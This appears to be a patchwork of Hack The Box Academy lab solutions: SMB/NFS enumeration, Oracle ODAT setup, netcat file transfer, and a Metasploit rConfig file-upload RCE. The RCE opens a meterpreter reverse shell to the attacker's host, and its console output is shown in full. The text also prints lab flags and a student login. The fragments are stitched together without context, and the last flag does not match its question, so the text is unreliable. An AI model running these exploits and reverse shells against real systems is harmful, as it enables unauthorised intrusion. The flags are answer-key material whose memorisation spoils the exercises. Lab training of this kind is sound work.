```shell
sudo nmap -p445 -sV -sC STMIP
```

```shell
smbclient -N -L STMIP
```

```shell
smbclient //STMIP/sambashare -N
get contents\flag.txt
!cat contents\\flag.txt
```

HTB{o873nz4xdo873n4zo873zn4fksuhldsf}

```shell
rpcclient -U "" STMIP
```

```shell
querydominfo
```

```shell-session
rpcclient $> netsharegetinfo sambashare
```
InFreight SMB v3.1

```shell
netsharegetinfo sambashare
```
C:\home\sambauser\

```shell-session
└──╼ [★]$ showmount -e 10.129.131.113
```

```shell
mkdir NFS
sudo mount -t nfs -v STMIP:/var/nfs ./NFS/
cat ./NFS/flag.txt
```

HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}

```shell
mkdir NFSShare
sudo mount -t nfs -v STMIP:/mnt/nfsshare ./NFSShare/
cat ./NFSShare/flag.txt
```

HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}

```shell
sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycrypto passlib python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```

```shell-session
import urllib.request as request
```

```shell
request.urlretrieve("http://STMIP/flag.txt", "flag.txt");
```
Students first need to SSH into the spawned target machine using the credentials `htb-student:HTB_@cademy_stdnt!`:

```shell
ssh htb-student@STMIP
```

```shell
wget https://academy.hackthebox.com/storage/modules/24/upload_nix.zip
unzip upload_nix.zip
```

```shell-session
scp upload_nix.txt htb-student@10.129.181.183:~/
```

```shell
nc -lp STMPO > upload_nix.txt
```

```shell
nc -w 3 STMIP STMPO < upload_nix.txt
```

```shell-session
hasher upload_nix.txt
```

This version is vulnerable to RCE, as shown in the "Discovering a Vulnerability in rConfig" subsection. Thus, students will need to use Metasploit to exploit this vulnerability (this exploit module requires a username and a password, however, because the aim of this module is to teach about Shells and Payloads mainly, students can leave out the default settings for the options USERNAME and PASSWORD, i.e., `admin:admin`:

Code: shell

```shell
msfconsole -q
set RHOSTS STMIP
set LHOST PWNIP
set SRVHOST PWNIP
exploit
```

  Infiltrating Linux

```shell-session
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce 
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > set RHOSTS 10.129.201.101 
setRHOSTS => 10.129.201.101

msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > set LHOST 10.10.14.253
LHOST => 10.10.14.253

msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > set SRVHOST 10.10.14.253
SRVHOST => 10.10.14.253

msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.253:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'busfcj.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (39282 bytes) to 10.129.201.101
[+] Deleted busfcj.php
[*] Meterpreter session 1 opened 
(10.10.14.253:4444 -> 10.129.201.101:37732)
at 2022-03-20 23:14:44 +0000

meterpreter >
```

Once a Metrepreter session has been established, students need to navigate to the "/devicedetails" directory to find out the hostname of the router, after reading the contents of the file "hostnameinfo.txt":

Code: shell

```shell
cd /devicedetails
cat hostnameinfo.txt
```

  Infiltrating Linux

```shell-session
meterpreter > cd /devicedetails
meterpreter > cat hostnameinfo.txt

Note: 

All yaml (.yml) files should be named after the hostname of the router or switch they will configure. We discussed this in our meeting back in January. Ask Bob about it.
```

Answer: {hidden}

HTB{R3m0t3DeskIsw4yT00easy}